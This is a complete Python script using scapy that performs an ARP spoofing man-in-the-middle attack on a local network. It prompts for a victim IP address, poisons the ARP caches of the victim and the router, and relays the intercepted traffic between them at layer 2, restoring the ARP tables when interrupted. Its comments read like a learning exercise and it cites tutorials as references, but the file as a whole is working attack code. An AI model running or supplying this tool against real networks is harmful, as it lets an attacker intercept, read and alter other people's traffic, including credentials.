from scapy.all import *
import os
import sys
from netifaces import * # Using for finding the router's IP Address

# This function help to find mac address using arp table (but cant find own arp infomation)
def find_mac_addr(ip, name): 
	try :
		mac = open("/proc/net/arp", "r").read().split(ip+" ")[1]
		mac = mac.split()[2]
	except IndexError:
		print "Can't find " + name + "'s MAC address"
		exit(1)
	else:
		return mac

# This function run arp poisoning (deceive arp information, psrc is deceived)
def arp_poison(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = v_mac))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = r_mac))

# This function run arp restoring (ff:ff:ff:ff:ff:ff mac address means "I want to find pdst's MAC address")
def arp_restore(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = "ff:ff:ff:ff:ff:ff"))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = "ff:ff:ff:ff:ff:ff"))

# Scapy must need SUPERUSER's permission
if os.getuid() != 0 :
	sys.exit("[!] please run as root")

# Find some object's IP Address and MAC Address
victim_IP = raw_input("> Input victim IP address : ")
attacker_IP = os.popen("ifconfig").read().split("inet addr:")[1].strip().split(' ')[0]
router_IP = gateways()['default'][AF_INET][0]
victim_MAC = find_mac_addr(victim_IP, "victim")
attacker_MAC = os.popen("ifconfig").read().split("HWaddr")[1].strip().split(' ')[0]
router_MAC = find_mac_addr(router_IP, "router")

# Print each object's IP Address and MAC Address 
print "--------------------------------------------------------"
print "[*] victim IP address     	: " + victim_IP
print "[*] victim MAC address    	: " + victim_MAC
print "[*] attacker IP address   	: " + attacker_IP
print "[*] attkacer MAC address 	: " + attacker_MAC
print "[*] router IP address 		: " + router_IP
print "[*] router Mac address  	: " + router_MAC
print "--------------------------------------------------------"
print "[*] ARP Spoofing Start"
print "--------------------------------------------------------"

# Sniff function which deal with packet
def packet_deal_with(pkt):
	# if ARP packet is sent, Get that packet and Send Fake packet
	if pkt.haslayer(ARP) == 1:
		arp_poison(victim_IP, router_IP, victim_MAC, router_MAC)
		print "ARP Poison"
	else :
		# Seize the pkt's property for Ether property's Setting
		if pkt[IP].src == victim_IP:
			# Set Ether property's options for MITM
			pkt[Ether].src = attacker_MAC
			pkt[Ether].dst = router_MAC
			# To elimintate errors made by UDP, IP
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			del pkt.chksum
			del pkt.len
			# Use sendp for running on layer 2 (cuz victim and router are communicated on LAN circumstance)
			sendp(pkt)
			print "victim -> router"

		# Seize the pkt's property for Ether property's Setting
		if pkt[IP].dst == victim_IP:
			# Set Ether property's options for MITM
			pkt[Ether].src = attacker_MAC
			pkt[Ether].dst = victim_MAC
			# To elimintate errors made by UDP, IP
			if pkt.haslayer(UDP) == 1:
				del pkt[UDP].chksum
				del pkt[UDP].len
			del pkt.chksum
			del pkt.len
			# Use sendp for running on layer 2 (cuz victim and router are communicated on LAN circumstance)
			sendp(pkt)
			print "router -> victim"

while True:
	# Until KeyboardInterrupt is occured, Sniff the packet
	try:
		sniff(prn=packet_deal_with, filter="host "+victim_IP+" or host "+router_IP, count=1)
	# If KeyboardInterrupt is occured, Stop to sniffing and Restore the arp table
	except KeyboardInterrupt as err:	
		print "--------------------------------------------------------"
		print "[*] ARP Spoofing Stop"
		print "--------------------------------------------------------"
		arp_restore(victim_IP, router_IP, victim_MAC, router_MAC)
		sys.exit("[!] Exit")

# REFERENCE
# 0. http://scapy.readthedocs.io/en/latest/usage.html
# 1. http://mccalbados.blogspot.kr/2013/08/lan-arp-spoofing.html
# 2. https://m.blog.naver.com/PostView.nhn?blogId=shoeking&logNo=220322505527&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F
# 3. https://github.com/OneTwo-asdfasdf/ARP_Poison/blob/master/ARP_Poison.py